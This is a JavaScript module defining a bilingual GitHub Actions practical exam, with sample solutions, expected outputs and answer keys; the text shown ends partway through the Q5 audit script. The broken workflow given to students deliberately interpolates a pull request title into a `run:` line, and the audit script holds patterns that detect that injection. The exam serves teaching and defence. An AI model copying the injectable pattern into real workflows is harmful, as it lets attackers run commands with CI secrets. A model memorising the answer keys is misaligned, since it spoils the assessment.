/**
 * GitHub Actions — Practical Exam (PE): 5 câu thực hành, tổng 10 điểm, nộp .zip.
 *
 * Đề tự soạn, bám sát `content/courses/github-actions/s00…s11`. Khác đề FE (50
 * câu trắc nghiệm, đọc log và đọc số đo), đề này bắt VIẾT HIỆN VẬT: một workflow
 * nổ đúng lúc, một composite action thay chín bản chép đã trôi dạt, một chỗ cache
 * có khoá đổi đúng lúc nội dung đổi, một job deploy theo quyền tối thiểu mà bí
 * mật không đi qua `run:`, và một script soi ra đúng những khuyết tật mà cả khoá
 * đã đo được.
 *
 * ⚠️ MỌI `sampleSolution` VÀ MỌI `expectedOutput` DƯỚI ĐÂY ĐÃ CHẠY THẬT trên
 * macOS 26.6.2 (darwin-arm64) · Node **v22.21.0** · GNU bash **3.2.57**, với:
 *   • **js-yaml 4.2.0** — bộ đọc YAML nằm sẵn trong `node_modules` của kho này.
 *     Cả năm tệp YAML/JSON của lời giải đều được `yaml.load()` / `JSON.parse()`
 *     phân giải thật, và mọi giá trị in trong "kết quả mong đợi" là thứ bộ đọc
 *     trả về, không phải thứ tôi tin là nó sẽ trả về.
 *   • **@actions/expressions 0.3.61** — bộ đánh giá biểu thức do CHÍNH GitHub
 *     xuất bản. Các điều kiện `if:` của Q1 và Q4 được đánh giá thật trên hai
 *     context (`bo_qua_test` = "false" và "true"), và bảng kết quả trong Q1 là
 *     đầu ra của nó.
 *   • **minimatch 9.0.9** — dùng để PHÁT LẠI bộ lọc `paths:` của Q1 trên sáu
 *     commit mẫu; đây là bộ so khớp glob, nên bảng "CHẠY / IM LẶNG" là kết quả
 *     so khớp thật chứ không phải suy luận.
 *   • **`node:crypto`** — `hashFiles()` được tái lập đúng thuật toán (SHA-256
 *     từng tệp → nối các bản băm dạng NHỊ PHÂN theo danh sách ĐÃ SẮP → SHA-256
 *     lần nữa) rồi chạy trên hai lockfile THẬT của kho này, nên hai khoá cache
 *     in trong Q3 là hai chuỗi hex thật.
 *   • **`bash -n`** — mọi khối `run:` trong lời giải Q2 và Q4, cùng toàn bộ
 *     `soat.sh` của Q5, đều được kiểm cú pháp shell thật.
 *   • **`bash soat.sh`** — lời giải Q5 được chạy thật HAI lần: một lần trên thư
 *     mục hỏng mà đề cho sẵn (6 cảnh báo, thoát 1) và một lần trên chính
 *     `.github/workflows` của kho này (11 tệp, 5 đạt 2 cảnh báo, thoát 1). Con
 *     số 44 lượt tham chiếu `secrets.*` khớp đúng phép đếm tay của bài 6.5 —
 *     `grep -c` ở đó đếm ra 35 vì nó đếm DÒNG, còn `grep -o` đếm ra 44.
 *
 * ⚠️ VÌ SAO CHỈ Q5 CÓ `khongChayDuoc`. Bốn câu đầu khai `language: 'yaml'`, mà
 * `yaml` NẰM SẴN trong tập `KHONG_CHAY_DUOC` của `scripts/exam-check.mjs` — bộ
 * kiểm tự nhận ra qua nhãn, in một dòng `ℹ`, và theo đúng chú thích trong
 * `_lib/ghactions-exam-kit.mjs` thì những câu ấy KHÔNG được và KHÔNG nên khai
 * thêm field này. Câu 5 khai `language: 'bash'` — một nhãn bộ kiểm CHẠY THẬT
 * được — nhưng lời giải cần một thư mục `.github/workflows` có thật để soi, nên
 * nó không tự chứa; vì thế nó khai `khongChayDuoc` kèm lý do đo được, và kết quả
 * hai lượt chạy thật được chép nguyên văn vào `expectedOutput`.
 *
 * ⚠️ MỘT CHỖ ĐỀ CỐ Ý KHÔNG THEO GIÁO TRÌNH. Bài 7.2 cho thấy `deploy-ghcr.yml`
 * đặt `cancel-in-progress: true`. Job của câu 4 chạy `prisma migrate deploy`,
 * tức một tác dụng phụ BẮT BUỘC hoàn tất, nên đề đòi `false` và nói rõ lý do
 * ngay trong đề bài — đúng theo cái LUẬT mà bài 7.2 phát biểu ("lần chạy này có
 * tác dụng phụ phải hoàn tất không?"), chứ không theo cái GIÁ TRỊ mà một tệp cụ
 * thể trong kho đang dùng. Lấy giá trị từ một cái mẫu thay vì từ câu hỏi ấy
 * chính là thứ bài 7.2 cảnh báo.
 *
 * Seed: node scripts/academy-seed-exam.mjs --file ./content/exams/GITHUB-ACTIONS-PE.mjs --apply
 */
import { B, c, code, codeQ } from './_lib/ghactions-exam-kit.mjs';

/**
 * Rubric riêng cho từng câu: tổng `maxScore` đúng bằng `points` của câu, nên
 * điểm từng tiêu chí cộng lại ra thẳng điểm câu — không phải quy đổi.
 */
const rubric = (rows) => rows.map(([id, en, vi, maxScore]) => ({
  id,
  criterion: B(en, vi),
  weight: maxScore,
  maxScore,
}));

/** Khung cho mỗi tệp YAML học viên nộp — hai mốc giữ đúng khuôn chung các đề PE. */
const starter = (n, ten, ghiChu) =>
  '# ── ĐỀ CHO SẴN — KHÔNG SỬA ─────────────────────────────────────────────\n' +
  `# Q${n}/${ten}\n` +
  ghiChu.split('\n').map((d) => `# ${d}`).join('\n') + '\n' +
  '\n' +
  '# ── VIẾT LỜI GIẢI CỦA BẠN Ở ĐÂY ────────────────────────────────────────\n' +
  '\n' +
  '\n' +
  '# ── ĐỀ CHO SẴN — KHÔNG SỬA ─────────────────────────────────────────────\n' +
  '# Chạy đúng những câu lệnh trong khối "kết quả mong đợi" rồi đối chiếu\n' +
  '# từng dòng một trước khi nộp.\n';

/* ── Khối YAML hỏng dùng chung cho Q3 và Q5 ─────────────────────────────── */

const HONG_YML =
  'name: Kiem tra (ban HONG)\n' +
  '\n' +
  'on:\n' +
  '  pull_request:\n' +
  '    branches: [main]\n' +
  '    paths:\n' +
  "      - 'src/*'\n" +
  '  push:\n' +
  '    branches: [main]\n' +
  '\n' +
  'jobs:\n' +
  '  kiem:\n' +
  '    runs-on: ubuntu-latest\n' +
  '    steps:\n' +
  '      - uses: actions/checkout@main\n' +
  '      - uses: actions/setup-node@v4\n' +
  '        with:\n' +
  '          node-version: 18.20\n' +
  '      - uses: actions/cache@v4\n' +
  '        with:\n' +
  '          path: node_modules/.cache\n' +
  '          key: backend-cache\n' +
  '      - name: Ghi lai tieu de PR\n' +
  '        run: echo "PR: ${{ github.event.pull_request.title }}"\n' +
  '      - name: Lint (tam tat)\n' +
  "        if: 'false'\n" +
  '        run: npm run lint 2>&1 | tail -30\n' +
  '      - name: Kiem kieu\n' +
  '        run: npx tsc --noEmit\n';

const INSTRUCTIONS =
  '<div class="ml-en">' +
  '<p><b>How to take this exam.</b></p>' +
  '<ol>' +
  '<li>Create a scratch git repository with a <code>.github/workflows/</code> directory. You do not need a GitHub account to pass: every question is checkable offline with the commands printed in its "expected output" block — a YAML parser, a glob matcher, a SHA-256 reproduction of <code>hashFiles()</code>, and <code>bash -n</code>. Install the three tools once: <code>npm i js-yaml minimatch @actions/expressions</code>.</li>' +
  '<li>Create five folders named <code>Q1 … Q5</code>. Each question names the exact file it wants inside its folder and shows a <b>Starter</b> block — copy it in <b>verbatim</b> and write your answer only between the two <code>ĐỀ CHO SẴN</code> markers. The commands in the "expected output" block are part of the grading; changing them is how you fail a question you actually solved.</li>' +
  '<li><b>Run everything before you submit.</b> A workflow that has never been through a YAML parser and a filter that has never been replayed over a file list are not answers. Two of these questions turn on a value that a parser produces and a reader does not — an unquoted version number and a quoted <code>false</code> — and neither is visible by reading.</li>' +
  '<li>Zip the five folders into <b>one .zip</b> and upload it in the submit box.</li>' +
  '</ol>' +
  '<p><b>How it is graded.</b> Behaviour first — a workflow that does not parse, a filter that selects the wrong events, or a script that cannot flag a defect it was written to flag cannot pass. But this is a GitHub Actions exam, so the <b>shape</b> of the artifact is graded too, and each of these costs marks <em>even when the file parses</em>: a required check behind a <code>paths:</code> filter, an action pinned to a moving branch, a cache key with no content hash in it, a secret interpolated into a <code>run:</code> body, a <code>run:</code> without <code>shell: bash</code> in a step that pipes, a missing <code>timeout-minutes</code>, and a <code>permissions:</code> block that names more than the job needs. Where a question asks for a choice — <code>cancel-in-progress</code>, for instance — the mark is for the <em>reason</em>, written as a comment in the file.</p>' +
  '<p><b>The broken workflow.</b> Questions 3 and 5 both refer to this file. Save it as <code>Q5/hong/hong.yml</code>.</p>' +
  code(HONG_YML) +
  '</div>' +
  '<div class="ml-vi">' +
  '<p><b>Cách làm bài thi.</b></p>' +
  '<ol>' +
  '<li>Tạo một kho git nháp có thư mục <code>.github/workflows/</code>. Bạn KHÔNG cần tài khoản GitHub để làm được bài: mọi câu đều kiểm được ngoại tuyến bằng đúng những câu lệnh in trong khối "kết quả mong đợi" của nó — một bộ đọc YAML, một bộ so khớp glob, một bản tái lập SHA-256 của <code>hashFiles()</code>, và <code>bash -n</code>. Cài ba công cụ một lần: <code>npm i js-yaml minimatch @actions/expressions</code>.</li>' +
  '<li>Tạo năm thư mục tên <code>Q1 … Q5</code>. Mỗi câu ghi rõ tệp nào phải nằm trong thư mục của nó và có một khối <b>Mã cho sẵn</b> — chép <b>nguyên văn</b> vào rồi chỉ viết lời giải ở vùng giữa hai mốc <code>ĐỀ CHO SẴN</code>. Các câu lệnh trong khối "kết quả mong đợi" là một phần của việc chấm; sửa chúng là cách trượt một câu mà bạn thật ra đã làm được.</li>' +
  '<li><b>Chạy thử mọi thứ trước khi nộp.</b> Một workflow chưa từng đi qua một bộ đọc YAML và một bộ lọc chưa từng được phát lại trên một danh sách tệp thì chưa phải lời giải. Hai trong năm câu ăn thua ở một giá trị mà BỘ ĐỌC sinh ra còn NGƯỜI ĐỌC thì không — một số phiên bản không nháy và một chữ <code>false</code> có nháy — và không cái nào nhìn bằng mắt mà thấy được.</li>' +
  '<li>Nén năm thư mục thành <b>một tệp .zip</b> rồi tải lên ô nộp bài.</li>' +
  '</ol>' +
  '<p><b>Chấm thế nào.</b> Hành vi trước — một workflow không phân giải được, một bộ lọc chọn sai sự kiện, hay một script không soi nổi đúng cái khuyết tật nó sinh ra để soi thì không thể qua. Nhưng đây là bài thi GitHub Actions, nên <b>hình dạng</b> của hiện vật cũng bị chấm, và mỗi thứ sau đây đều bị trừ điểm <em>ngay cả khi tệp vẫn phân giải được</em>: một required check nấp sau bộ lọc <code>paths:</code>, một action ghim vào nhánh di động, một khoá cache không có hash nội dung, một bí mật nội suy vào thân <code>run:</code>, một <code>run:</code> thiếu <code>shell: bash</code> trong bước có dùng ống, một job thiếu <code>timeout-minutes</code>, và một khối <code>permissions:</code> nêu nhiều hơn thứ job cần. Chỗ nào đề hỏi một LỰA CHỌN — ví dụ <code>cancel-in-progress</code> — thì điểm nằm ở <em>LÝ DO</em>, viết thành chú thích ngay trong tệp.</p>' +
  '<p><b>Cái workflow hỏng.</b> Câu 3 và câu 5 đều nhắc tới tệp này. Hãy lưu nó thành <code>Q5/hong/hong.yml</code>.</p>' +
  code(HONG_YML) +
  '</div>';

/* ─────────────────────────── Câu 1 ─────────────────────────── */

const Q1_SOLUTION =
  'name: Kiem tra ma\n' +
  '\n' +
  'on:\n' +
  '  # KHONG co paths: o day. Mot required check bi loc ra thi khong bao gio bao,\n' +
  '  # va PR ket vinh vien o "Expected — Waiting for status to be reported".\n' +
  '  pull_request:\n' +
  '    branches: [main]\n' +
  '  push:\n' +
  '    branches: [main]\n' +
  '    paths:\n' +
  '      - "src/**"\n' +
  '      - "frontend/src/**"\n' +
  '      - "package-lock.json"\n' +
  '  workflow_dispatch:\n' +
  '    inputs:\n' +
  '      bo_qua_test:\n' +
  '        description: "Bo qua bo test (chi dung khi da chay o may)"\n' +
  '        type: boolean\n' +
  '        default: false\n' +
  '\n' +
  '# Nhom theo workflow + ref: hai PR khac nhau khong huy nhau.\n' +
  '# cancel-in-progress: true vi job nay KHONG co tac dung phu nao phai hoan tat.\n' +
  'concurrency:\n' +
  '  group: ${{ github.workflow }}-${{ github.ref }}\n' +
  '  cancel-in-progress: true\n' +
  '\n' +
  '# Neu MOT pham vi la moi pham vi khac ve none.\n' +
  'permissions:\n' +
  '  contents: read\n' +
  '\n' +
  'jobs:\n' +
  '  kiem:\n' +
  '    name: Kiem kieu va test\n' +
  '    runs-on: ubuntu-24.04\n' +
  '    timeout-minutes: 10\n' +
  '    defaults:\n' +
  '      run:\n' +
  '        shell: bash          # them pipefail cho MOI buoc run: cua job\n' +
  '    steps:\n' +
  '      - uses: actions/checkout@v4\n' +
  '      - uses: actions/setup-node@v4\n' +
  '        with:\n' +
  '          node-version: "22"   # co nhay: 18.20 khong nhay se thanh so 18.2\n' +
  '          cache: "npm"\n' +
  '\n' +
  '      - name: Cai goi\n' +
  '        run: npm ci --no-audit --no-fund\n' +
  '\n' +
  '      - name: Ghi lai tieu de PR\n' +
  "        if: github.event_name == 'pull_request'\n" +
  '        env:\n' +
  '          TIEU_DE: ${{ github.event.pull_request.title }}\n' +
  '        run: |\n' +
  '          echo "PR: $TIEU_DE"\n' +
  '\n' +
  '      - name: Kiem kieu\n' +
  '        run: npx tsc --noEmit\n' +
  '\n' +
  '      - name: Test\n' +
  "        if: inputs.bo_qua_test != 'true'\n" +
  '        run: |\n' +
  '          npm test\n';

const Q1_OUTPUT =
  '$ node kiem-q1.mjs        # doc bang js-yaml 4.2.0\n' +
  'khoa cap tren  : name, on, concurrency, permissions, jobs\n' +
  'trigger        : pull_request, push, workflow_dispatch\n' +
  'pull_request   : {"branches":["main"]}\n' +
  'push.paths     : ["src/**","frontend/src/**","package-lock.json"]\n' +
  'input          : {"description":"Bo qua bo test (chi dung khi da chay o may)",\n' +
  '                  "type":"boolean","default":false}\n' +
  'concurrency    : {"group":"${{ github.workflow }}-${{ github.ref }}",\n' +
  '                  "cancel-in-progress":true}\n' +
  'permissions    : {"contents":"read"}\n' +
  'runs-on        : ubuntu-24.04 | timeout-minutes: 10 | defaults.run.shell: bash\n' +
  'node-version   : "22" string\n' +
  'run: co github.event: 0\n' +
  '\n' +
  '-- Phat lai bo loc paths tren sau commit mau (minimatch 9.0.9) --\n' +
  'A chi sua README ................... push -> IM LANG | pull_request -> CHAY\n' +
  'B sua src/services/llm/gateway.ts .. push -> CHAY    | pull_request -> CHAY\n' +
  'C sua frontend/src/app/page.tsx .... push -> CHAY    | pull_request -> CHAY\n' +
  'D chi sua .github/workflows ........ push -> IM LANG | pull_request -> CHAY\n' +
  'E sua package-lock.json ............ push -> CHAY    | pull_request -> CHAY\n' +
  'F sua src/index.ts + docs .......... push -> CHAY    | pull_request -> CHAY\n' +
  '\n' +
  '-- Dieu kien, do bang @actions/expressions 0.3.61 --\n' +
  'bo_qua_test = "false" | inputs.bo_qua_test           -> "false" truthy=true\n' +
  'bo_qua_test = "false" | inputs.bo_qua_test != \'true\' -> "true"  truthy=true\n' +
  'bo_qua_test = "false" | !inputs.bo_qua_test          -> "false" truthy=false\n' +
  'bo_qua_test = "true"  | inputs.bo_qua_test           -> "true"  truthy=true\n' +
  'bo_qua_test = "true"  | inputs.bo_qua_test != \'true\' -> "false" truthy=false\n' +
  'bo_qua_test = "true"  | !inputs.bo_qua_test          -> "false" truthy=false\n' +
  '\n' +
  '=> chi dang SO SANH TUONG MINH moi bo qua duoc dung luc; dang phu dinh\n' +
  '   `!inputs.bo_qua_test` cho ra false o CA HAI, tuc bo test khong bao gio chay.';

/* ─────────────────────────── Câu 2 ─────────────────────────── */

const Q2_SOLUTION =
  'name: Cai SSH toi VPS\n' +
  'description: Ghi khoa deploy ra dia va dung ~/.ssh/config, kem giu-ket-noi.\n' +
  '\n' +
  'inputs:\n' +
  '  host:\n' +
  '    description: Ten may chu\n' +
  '    required: true\n' +
  '  user:\n' +
  '    description: Nguoi dung SSH\n' +
  '    required: true\n' +
  '  khoa_b64:\n' +
  '    description: Khoa rieng, da ma hoa base64\n' +
  '    required: true\n' +
  '\n' +
  'runs:\n' +
  '  using: composite\n' +
  '  steps:\n' +
  '    # shell: BAT BUOC tren moi run: cua composite action — bo di la LOI.\n' +
  '    - shell: bash\n' +
  '      # Ba gia tri deu di qua env:, khong cai nao noi suy thang vao run:.\n' +
  '      # Composite action KHONG doc duoc context bi mat — no chi thay inputs.\n' +
  '      env:\n' +
  '        HOST: ${{ inputs.host }}\n' +
  '        USER_SSH: ${{ inputs.user }}\n' +
  '        KHOA_B64: ${{ inputs.khoa_b64 }}\n' +
  '      run: |\n' +
  '        set -euo pipefail\n' +
  '        mkdir -p ~/.ssh && chmod 700 ~/.ssh\n' +
  '        printf "%s" "$KHOA_B64" | base64 -d > ~/.ssh/deploy_key\n' +
  '        chmod 600 ~/.ssh/deploy_key\n' +
  '        # Ban da GIAI MA nam NGOAI mat na cua GitHub (mat na chi phu dung\n' +
  '        # chuoi base64 da luu) — dang ky lai truoc khi bat cu buoc nao\n' +
  '        # co the in no ra.\n' +
  '        echo "::add-mask::$(cat ~/.ssh/deploy_key)"\n' +
  '        ssh-keyscan -H "$HOST" >> ~/.ssh/known_hosts 2>/dev/null || true\n' +
  '        {\n' +
  '          echo "Host vps"\n' +
  '          echo "  HostName $HOST"\n' +
  '          echo "  User $USER_SSH"\n' +
  '          echo "  IdentityFile ~/.ssh/deploy_key"\n' +
  '          echo "  StrictHostKeyChecking yes"\n' +
  '          echo "  ServerAliveInterval 60"\n' +
  '          echo "  ServerAliveCountMax 10"\n' +
  '          echo "  ConnectTimeout 30"\n' +
  '        } > ~/.ssh/config\n' +
  '        chmod 600 ~/.ssh/config\n' +
  '\n' +
  '# ── Q2/goi.yml — noi goi, chep vao mot job bat ky ─────────────────────\n' +
  '#      - uses: actions/checkout@v4        # BAT BUOC truoc uses: ./... cuc bo\n' +
  '#      - uses: ./.github/actions/ssh-vps\n' +
  '#        with:\n' +
  '#          host:     ${{ secrets.VPS_HOST }}\n' +
  '#          user:     ${{ secrets.VPS_USER }}\n' +
  '#          khoa_b64: ${{ secrets.VPS_SSH_PRIVATE_KEY }}\n';

const Q2_OUTPUT =
  '$ node kiem-q2.mjs        # doc bang js-yaml 4.2.0\n' +
  'runs.using               : composite\n' +
  'inputs                   : host, user, khoa_b64\n' +
  'so buoc run:             : 1\n' +
  'buoc run: THIEU shell:   : 0\n' +
  'tham chieu secrets.* trong action: 0\n' +
  'noi suy ${{ }} thang vao run: : 0\n' +
  'co ::add-mask::          : true\n' +
  'noi goi                  : {"host":"${{ secrets.VPS_HOST }}",\n' +
  '                            "user":"${{ secrets.VPS_USER }}",\n' +
  '                            "khoa_b64":"${{ secrets.VPS_SSH_PRIVATE_KEY }}"}\n' +
  '\n' +
  '$ bash -n <khoi run: da tach ra>\n' +
  'Q2 bash -n khoi run: #1 CU PHAP HOP LE\n' +
  '\n' +
  '-- Vi sao khoi nay dang duoc rut ra --\n' +
  '9 khoi Setup SSH giong nhau nam o 9 workflow, va chung DA TROI thanh 2 ban:\n' +
  '  ban A — 7 workflow: khong co ServerAliveInterval/CountMax/ConnectTimeout\n' +
  '  ban B — 2 workflow: CO ba dong giu-ket-noi do\n' +
  'Loi giai nay giu ban B cho ca chin cho.';

/* ─────────────────────────── Câu 3 ─────────────────────────── */

const Q3_SOLUTION =
  '      # 1) Cache tai ve cua trinh quan ly goi — MOT DONG, do duoc 40% buoc cai\n' +
  '      #    (31,4s lanh -> 18,8s am). No KHONG go bo duoc buoc cai.\n' +
  '      - uses: actions/setup-node@v4\n' +
  '        with:\n' +
  "          node-version: '22'\n" +
  "          cache: 'npm'\n" +
  '\n' +
  '      # 2) Cache ban dung Next.js. Khoa = tien to noi TEN + NEN TANG + hash NOI DUNG.\n' +
  '      - name: Cache ban dung Next.js\n' +
  '        uses: actions/cache@v4\n' +
  '        with:\n' +
  '          path: frontend/.next/cache\n' +
  "          key: nextjs-cache-${{ runner.os }}-frontend-lock-${{ hashFiles('frontend/package-lock.json') }}\n" +
  '          # Trung tien to = VAN TRUOT khoa chinh -> buoc post LUU muc moi, nen\n' +
  '          # cache tu lan ve phia truoc. Hop le o day vi mot cu trung cu chi\n' +
  '          # TANG TOC mot buoc dung van chay, chu khong THAY THE buoc do.\n' +
  '          restore-keys: |\n' +
  '            nextjs-cache-${{ runner.os }}-frontend-lock-\n' +
  '            nextjs-cache-${{ runner.os }}-frontend-\n' +
  '\n' +
  '      # 3) Thay cho buoc CHET. `node_modules/.cache` khong bao gio ton tai trong\n' +
  '      #    du an nay, va khoa `backend-cache` la HANG SO nen no dong cung o lan\n' +
  '      #    chay MOT. Duong dan moi chi ton tai SAU KHI bat incremental —\n' +
  '      #    xem Q3/tsconfig-them.json.\n' +
  '      - name: Cache ban dung backend (tsc incremental)\n' +
  '        uses: actions/cache@v4\n' +
  '        with:\n' +
  '          path: .tsbuildinfo\n' +
  "          key: backend-tsbuildinfo-${{ runner.os }}-${{ hashFiles('package-lock.json', 'tsconfig.json') }}\n" +
  '          restore-keys: |\n' +
  '            backend-tsbuildinfo-${{ runner.os }}-\n' +
  '\n' +
  '# ── Q3/tsconfig-them.json — hop nhat vao tsconfig.json ────────────────\n' +
  '# {\n' +
  '#   "compilerOptions": {\n' +
  '#     "incremental": true,\n' +
  '#     "tsBuildInfoFile": ".tsbuildinfo"\n' +
  '#   }\n' +
  '# }\n';

const Q3_OUTPUT =
  '$ node kiem-q3.mjs        # js-yaml 4.2.0 + tai lap hashFiles bang node:crypto\n' +
  'so buoc          : 3\n' +
  'moi khoa deu co runner.os?  true\n' +
  'moi khoa deu co hashFiles?  true\n' +
  'cac path duoc cache: frontend/.next/cache | .tsbuildinfo\n' +
  '\n' +
  '-- Khoa tinh THAT tren hai lockfile cua kho nay --\n' +
  'khoa 2 (Next.js) : nextjs-cache-Linux-frontend-lock-\n' +
  '                   59fac4d7c5cc0e16c06717fa22582cb3f5a8ef152e9c3bfe45c7c3a2aa7dfdcc\n' +
  'khoa 3 (tsc)     : backend-tsbuildinfo-Linux-\n' +
  '                   93365e14624ca0b0f5120a44b906bd7af4c846d7cf6185ecb439ed47172f7807\n' +
  '\n' +
  'doi thu tu tham so hashFiles -> khoa GIONG NHAU? true   (danh sach da SAP)\n' +
  'go sai glob (pakage-lock.json) -> hashFiles = ""\n' +
  '   => khoa co lai thanh "backend-tsbuildinfo-Linux-", mot HANG SO\n' +
  '\n' +
  '-- Ba lan chay lien tiep tren cung mot nhanh phai ra dung hinh nay --\n' +
  'lan 1: Cache not found for input keys: <khoa moi>, <restore-key>   -> LUU\n' +
  'lan 2: Cache hit occurred on the primary key <khoa moi>, not saving cache\n' +
  'lan 3: Cache hit occurred on the primary key <khoa moi>, not saving cache\n' +
  'Bat cu hinh nao khac deu la mot con bo — ke ca dong\n' +
  '  [warning]Path Validation Error: ... do(es) not exist\n' +
  'tuc buoc cu CHUA BAO GIO luu noi mot byte.';

/* ─────────────────────────── Câu 4 ─────────────────────────── */

const Q4_SOLUTION =
  'name: Deploy backend len VPS\n' +
  '\n' +
  'on:\n' +
  '  workflow_dispatch:\n' +
  '    inputs:\n' +
  '      xac_nhan:\n' +
  '        description: "Go DEPLOY de xac nhan"\n' +
  '        required: true\n' +
  '        type: string\n' +
  '\n' +
  '# Neu tren cung: mac dinh toi thieu cho MOI job.\n' +
  'permissions:\n' +
  '  contents: read\n' +
  '\n' +
  '# Job nay chay `prisma migrate deploy` — mot tac dung phu BAT BUOC hoan tat,\n' +
  '# nen mot luot bi vuot mat KHONG duoc giet giua chung. Day la ly do chon\n' +
  '# false; deploy-ghcr.yml chon true vi no khong chay migration.\n' +
  'concurrency:\n' +
  '  group: deploy-backend\n' +
  '  cancel-in-progress: false\n' +
  '\n' +
  'jobs:\n' +
  '  deploy:\n' +
  '    runs-on: ubuntu-24.04\n' +
  '    timeout-minutes: 20\n' +
  '    # Cong con nguoi SONG SOT duoc khi trigger doi tu tay sang push, va no\n' +
  '    # khoa bi mat cua production vao dung nhanh duoc phep deploy.\n' +
  '    environment:\n' +
  '      name: production\n' +
  '      url: https://cuongthai.com\n' +
  '    # Khoi o muc job THAY THE khoi tren cung -> phai liet ke lai contents: read.\n' +
  '    permissions:\n' +
  '      contents: read\n' +
  '      packages: write\n' +
  '    defaults:\n' +
  '      run:\n' +
  '        shell: bash\n' +
  '    steps:\n' +
  '      - uses: actions/checkout@v4\n' +
  '        with:\n' +
  '          persist-credentials: false   # dung de header xac thuc lai .git/config\n' +
  '\n' +
  '      - name: Xac nhan dau vao\n' +
  "        if: inputs.xac_nhan != 'DEPLOY'\n" +
  '        run: |\n' +
  '          echo "::error::Phai go dung chu DEPLOY de xac nhan."\n' +
  '          exit 1\n' +
  '\n' +
  '      - name: Cai SSH\n' +
  '        uses: ./.github/actions/ssh-vps\n' +
  '        with:\n' +
  '          host:     ${{ secrets.VPS_HOST }}\n' +
  '          user:     ${{ secrets.VPS_USER }}\n' +
  '          khoa_b64: ${{ secrets.VPS_SSH_PRIVATE_KEY }}\n' +
  '\n' +
  '      - name: Dang nhap GHCR\n' +
  '        env:\n' +
  '          GHCR_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n' +
  '        run: |\n' +
  '          printf "%s" "$GHCR_TOKEN" | docker login ghcr.io -u "$GITHUB_ACTOR" --password-stdin\n' +
  '\n' +
  '      - name: Trao anh va chay migration\n' +
  '        env:\n' +
  '          # Bi mat toi shell qua env:, KHONG noi suy vao than run:.\n' +
  '          DB_URL: ${{ secrets.DATABASE_URL }}\n' +
  '          THE: ${{ github.sha }}\n' +
  '        run: |\n' +
  '          set -euo pipefail\n' +
  '          # Gia tri DAN XUAT nam NGOAI mat na -> dang ky lai truoc khi dung.\n' +
  '          HOST_DB="${DB_URL##*@}"\n' +
  '          HOST_DB="${HOST_DB%%:*}"\n' +
  '          echo "::add-mask::$HOST_DB"\n' +
  '          echo "Deploy $THE toi $HOST_DB"\n' +
  '          ssh vps "cd /opt/cuonghoangdev && ./trao.sh $THE"\n' +
  '\n' +
  '      - name: Smoke test — 404 la BAN DUNG CU\n' +
  '        run: |\n' +
  '          set -euo pipefail\n' +
  '          for r in health ai/models gifs; do\n' +
  '            ma=$(curl -s -o /dev/null -w "%{http_code}" "https://cuongthai.com/api/v1/$r")\n' +
  '            echo "$r -> $ma"\n' +
  '            if [ "$ma" = "404" ]; then\n' +
  '              echo "::error::route $r chua mount — ban dung cu"\n' +
  '              exit 1\n' +
  '            fi\n' +
  '          done\n' +
  '          echo "moi route deu da mount"\n';

const Q4_OUTPUT =
  '$ node kiem-q4.mjs        # doc bang js-yaml 4.2.0\n' +
  'permissions (tren cung)      : {"contents":"read"}\n' +
  'permissions (job)            : {"contents":"read","packages":"write"}\n' +
  'environment                  : {"name":"production","url":"https://cuongthai.com"}\n' +
  'concurrency                  : {"group":"deploy-backend","cancel-in-progress":false}\n' +
  'persist-credentials          : false\n' +
  'so buoc run:                 : 4\n' +
  'run: co noi suy secrets      : 0\n' +
  'run: co noi suy github.event : 0\n' +
  'buoc dung bi mat qua env:    : 2\n' +
  'co ::add-mask:: cho gia tri dan xuat: true\n' +
  'defaults.run.shell           : bash\n' +
  'timeout-minutes              : 20\n' +
  '\n' +
  '$ bash -n <tung khoi run: da tach ra>\n' +
  'bash -n khoi run: #1 CU PHAP HOP LE\n' +
  'bash -n khoi run: #2 CU PHAP HOP LE\n' +
  'bash -n khoi run: #3 CU PHAP HOP LE\n' +
  'bash -n khoi run: #4 CU PHAP HOP LE\n' +
  '\n' +
  '-- Vi sao phai ::add-mask:: gia tri dan xuat --\n' +
  'Do that tren mot khoa ed25519 vua sinh: giua ban base64 (thu GitHub CHE)\n' +
  'va ban da giai ma, so chuoi con CHUNG la:\n' +
  '  9 ky tu -> 0        6 ky tu -> 0\n' +
  'Mat na la phep tim CHUOI CHINH XAC, nen no khong nhan ra ban dan xuat.';

/* ─────────────────────────── Câu 5 ─────────────────────────── */

const Q5_SOLUTION =
  '#!/usr/bin/env bash\n' +
  '# soat.sh — soat mot thu muc workflow, in ra DAT/CANH BAO cho tung phep kiem.\n' +
  '# Dung:  bash soat.sh [thu-muc]        (mac dinh .github/workflows)\n' +
  'set -o pipefail\n' +
  'W="${1:-.github/workflows}"\n' +
  'canh_bao=0\n' +
  'dat=0\n' +
  '\n' +
  'bao() {  # bao <ket-qua 0=dat> <nhan> <chi-tiet>\n' +
  '  if [ "$1" -eq 0 ]; then dat=$((dat+1)); printf \'  DAT       %-42s %s\\n\' "$2" "$3"\n' +
  '  else canh_bao=$((canh_bao+1)); printf \'  CANH BAO  %-42s %s\\n\' "$2" "$3"; fi\n' +
  '}\n' +
  '# grep -o dem SO LAN, grep -c dem SO DONG. Bai 6.5 lech 9 vi dung -c.\n' +
  'dem() { grep -h -o "$1" "$W"/*.yml 2>/dev/null | wc -l | tr -d \' \'; }\n' +
  '\n' +
  'echo "=== SOAT WORKFLOW: $W ==="\n' +
  'so_tep=$(ls "$W"/*.yml 2>/dev/null | wc -l | tr -d \' \')\n' +
  'echo "  ($so_tep tep .yml)"\n' +
  'echo\n' +
  '\n' +
  'n=$(grep -h -A40 \'^[[:space:]]*run:\' "$W"/*.yml 2>/dev/null | grep -c \'${{ *github\\.event\\.\' | tr -d \' \')\n' +
  'bao $([ "$n" -eq 0 ] && echo 0 || echo 1) "bieu thuc github.event trong run:" "$n cho"\n' +
  '\n' +
  'n=$(grep -l \'pull_request_target\' "$W"/*.yml 2>/dev/null | wc -l | tr -d \' \')\n' +
  'bao $([ "$n" -eq 0 ] && echo 0 || echo 1) "workflow dung pull_request_target" "$n workflow"\n' +
  '\n' +
  'n=$(dem \'uses: *[^ ]*@\\(main\\|master\\|develop\\)\')\n' +
  'bao $([ "$n" -eq 0 ] && echo 0 || echo 1) "action ghim vao mot NHANH" "$n cho"\n' +
  '\n' +
  'tong=$(dem \'uses: *[^ ]*@[^ ]*\'); sha=$(dem \'uses: *[^ ]*@[0-9a-f]\\{40\\}\')\n' +
  'bao $([ "$tong" -eq 0 ] || [ "$sha" -eq "$tong" ] && echo 0 || echo 1) "action ghim bang SHA" "$sha / $tong"\n' +
  '\n' +
  'n=$(grep -l \'^permissions:\' "$W"/*.yml 2>/dev/null | wc -l | tr -d \' \')\n' +
